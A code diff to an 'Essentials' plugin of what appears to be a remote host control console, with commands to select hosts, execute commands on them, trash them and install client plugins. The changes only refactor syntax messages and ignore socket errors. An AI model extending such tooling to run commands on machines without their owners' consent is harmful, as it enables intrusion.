@@ -17,7 +17,7 @@ class Essentials(Plugin):
         Help: [command]"""
         ret = [None, 0, ""]
         if len(args) > 1:
-            ret[2] = ("Syntax : %s" % self.__cmd_help__["help"])
+            ret[2] = ("Syntax : %s" % self.__server_cmds__["help"].__syntax__)
             ret[1] = 1 #Invalid Syntax Error Code
         else:
             ret[2] = server.help(args)
@@ -64,7 +64,7 @@ class Essentials(Plugin):
         Help: <host ID>"""
         ret = [None, 0, ""]
         if len(args) != 1 or not args[0].isdigit():
-            ret[2] = ("Syntax : %s" % self.__cmd_help__["Choose_Host"])
+            ret[2] = ("Syntax : %s" % self.__server_cmds__["choose_host"].__syntax__)
             ret[1] = 1 #Invalid Syntax Error Code
         else:
             ret[1], ret[2] = server.select([args[0]])
@@ -78,7 +78,7 @@ class Essentials(Plugin):
         Help: <host ID> [host ID] [host ID] ..."""
         ret = [None, 0, ""]
         if len(args) == 0:
-            ret[2] = ("Syntax : %s" % self.__cmd_help__["Select"])
+            ret[2] = ("Syntax : %s" % self.__server_cmds__["select"].__syntax__)
             ret[1] = 1 #Invalid Syntax Error Code
         else:
             ret[1], ret[2] = server.select(args)
@@ -113,7 +113,10 @@ class Essentials(Plugin):
         ret = [None, 0, ""]
         hosts = server.get_selected()
         for host in hosts:
-            host.trash()
+            try:
+                host.trash()
+            except sock_error:
+                pass
         ret[0] = "basic"
         return ret
 
@@ -139,7 +142,7 @@ class Essentials(Plugin):
         ret = [None, 0, ""]
         host = server.get_selected()[0]
         if len(args) == 0:
-            ret[2] = ("Syntax : %s" % self.__cmd_help__["Execute"])
+            ret[2] = ("Syntax : %s" % self.__server_cmds__["execute"].__syntax__)
             ret[1] = 1 #Invalid Syntax Error Code
         else:
             command = " ".join(args)
@@ -212,7 +215,7 @@ class Essentials(Plugin):
         ret = [None,0,""]
         hosts = server.get_selected()
         if len(args) < 1:
-            ret[2] = ("Syntax : %s" % self.__cmd_help__["Client_Load_Plugin"])
+            ret[2] = ("Syntax : %s" % self.__server_cmds__["client_install_plugin"].__syntax__)
             ret[1] = 1 # Invalid Syntax Error Code
         else:
             cmd = args[0]
